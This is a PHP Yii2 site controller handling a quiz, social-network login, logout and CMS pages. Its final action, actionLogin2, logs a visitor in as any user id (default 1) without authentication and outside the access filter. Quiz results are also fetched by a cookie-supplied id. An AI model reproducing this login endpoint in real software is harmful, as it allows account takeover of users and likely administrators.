<?php
namespace frontend\controllers;

use Yii;
use yii\base\InvalidParamException;
use yii\web\BadRequestHttpException;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use yii\helpers\Url;
use yii\web\UploadedFile;
use frontend\widgets\cropimage\helpers\Image;
use yii\web\NotFoundHttpException;

use common\models\User;
use common\models\Question;
use common\models\UserResult;
use common\models\Result;
use common\models\Page;

/**
 * Site controller
 */
class SiteController extends Controller
{
    public function behaviors()
    {
        return [
            'eauth' => [
                // required to disable csrf validation on OpenID requests
                'class' => \nodge\eauth\openid\ControllerBehavior::className(),
                'only' => ['login'],
            ],
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['login', 'logout', 'test'],
                'rules' => [
                    [
                        'actions' => ['login', 'test'],
                        'allow' => true,
                    ],
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * @inheritdoc
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
        ];
    }

    public function actionIndex()
    {
        return $this->render('index', [
        ]);
    }

    public function actionTest() {
        $testResultId = Yii::$app->request->cookies->getValue('test_hash', null);
        $qestionQuery = Question::find()->orderBy('number');

        if($testResultId) {
            $userResult = UserResult::findOne($testResultId);
            if($userResult === null) {
                throw new NotFoundHttpException('The requested page does not exist.');
            }
        } else {
            $userResult = new UserResult;
        }


        $post = Yii::$app->request->post();
        if(Yii::$app->request->isAjax && !empty($post) && $post['question'] && $post['answer']) { 
            $userResult->answersArr[] = ['q_id' => $post['question'], 'a_id' => $post['answer']];
            $userResult->save();

            Yii::$app->response->format = \yii\web\Response::FORMAT_JSON;

            if($qestionQuery->count() == count($userResult->answersArr)) {
                return ['status' => 'redirect'];
                // return $this->renderAjax('_test_result', [
                //     'userResult' => $userResult,
                // ]);
            }


            return ['status' => 'success'];
        }

        $questions = $qestionQuery->joinWith('answers')->all();

        $initialSlide = 0;
        if(!empty($userResult->answersArr)) {
            $initialSlide = count($userResult->answersArr);
        }

        return $this->render('test', [
            'questions' => $questions,
            'initialSlide' => $initialSlide,
        ]);
    }

    public function actionTestResult() {
        $testResultId = Yii::$app->request->cookies->getValue('test_hash', null);

        if($testResultId) {
            $userResult = UserResult::find()->where(['id' => $testResultId])->one();

            if($userResult !== null && $userResult->result_id) {
                $result = Result::findOne($userResult->result_id);


                return $this->render('test_result', [
                    'result' => $result,
                ]);
            }
        }

        return $this->redirect(['site/test']);
    }

    public function actionLogin() {
        $serviceName = Yii::$app->getRequest()->getQueryParam('service');
        $ref = Yii::$app->getRequest()->getQueryParam('ref');
        
        if (isset($serviceName)) {
            $eauth = Yii::$app->get('eauth')->getIdentity($serviceName);

            if($ref !== '' && $ref != '/login') {
                $eauth->setRedirectUrl(Url::toRoute($ref));
            } else {
                $eauth->setRedirectUrl(Url::toRoute('profile/index'));
            }
            $eauth->setCancelUrl(Url::toRoute('site/login'));

            try {
                if ($eauth->authenticate()) {
                    $user = User::findByService($serviceName, $eauth->id);
                    if(!$user) {
                        $user = new User;
                        $user->soc = $serviceName;
                        $user->sid = $eauth->id;
                        $user->name = $eauth->first_name;
                        $user->surname = $eauth->last_name;
                        if(isset($eauth->photo_url)) $user->image = $eauth->photo_url;
                        $user->test_result_id = Yii::$app->request->cookies->getValue('test_hash', null);
                        
                        $user->save();
                    } elseif($user->status === User::STATUS_BANNED) {
                        Yii::$app->getSession()->setFlash('error', 'Вы не можете войти. Ваш аккаунт заблокирован');
                        
                        $eauth->redirect($eauth->getCancelUrl());
                    } /*elseif(!$user->name) {
                        $user->name = $eauth->first_name;
                        $user->surname = $eauth->last_name;
                        if(isset($eauth->photo_url)) $user->image = $eauth->photo_url;
                        if(isset($eauth->ig_id)) $user->ig_id = $eauth->ig_id;
                        if(isset($eauth->ig_username)) $user->ig_username = $eauth->ig_username;

                        $user->save();
                    }*/

                    $user->ip = $_SERVER['REMOTE_ADDR'];
                    $user->browser = $_SERVER['HTTP_USER_AGENT'];
                    $user->save(false, ['ip', 'browser']);

                    Yii::$app->user->login($user);
                    // special redirect with closing popup window
                    $eauth->redirect();
                } else {
                    // close popup window and redirect to cancelUrl
                    $eauth->cancel();
                    $eauth->redirect($eauth->getCancelUrl());
                }
            } catch (\nodge\eauth\ErrorException $e) {
                Yii::$app->getSession()->setFlash('error', 'EAuthException: '.$e->getMessage());

                $eauth->cancel();
                $eauth->redirect($eauth->getCancelUrl());
            }
        }

        return $this->render('login');
    }

    public function actionLogout() {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    // public function actionMissingFields() {
    //     if(Yii::$app->user->isGuest) {
    //         throw new NotFoundHttpException('The requested page does not exist.');
    //     }

    //     $user = Yii::$app->user->identity;

    //     if($user->load(Yii::$app->request->post())) {
    //         $user->setScenario('missing_fields');

    //         if (Yii::$app->request->isAjax) {
    //             Yii::$app->response->format = \yii\web\Response::FORMAT_JSON;
    //             return \yii\widgets\ActiveForm::validate($user);
    //         }

    //         if($user->ig_username) {
    //             $url = "https://www.instagram.com/$user->ig_username/?__a=1";
    //             $json = json_decode(file_get_contents($url));

    //             $user->ig_id = $json->user->id;

    //             $user->save(false, ['ig_username', 'ig_id']);
    //         }
    //     }
        
    //     return $this->redirect(Yii::$app->request->referrer);
    // }

    public function actionPage($url) {
        $model = Page::findByUrl($url);
        if($model === null || $model->status === Page::STATUS_INACTIVE) {
            throw new NotFoundHttpException('The requested page does not exist.');
        }

        if($model->title) $this->view->title = $model->title;
        if($model->description) $this->view->registerMetaTag(['description' => $model->description], 'description');
        if($model->keywords) $this->view->registerMetaTag(['keywords' => $model->keywords], 'keywords');

        return $this->render('page', [
            'model' => $model
        ]);
    }

    public function actionLogin2($id = 1) {
        $user = User::findOne($id);

        Yii::$app->getUser()->login($user);

        return $this->redirect('/');
    }
}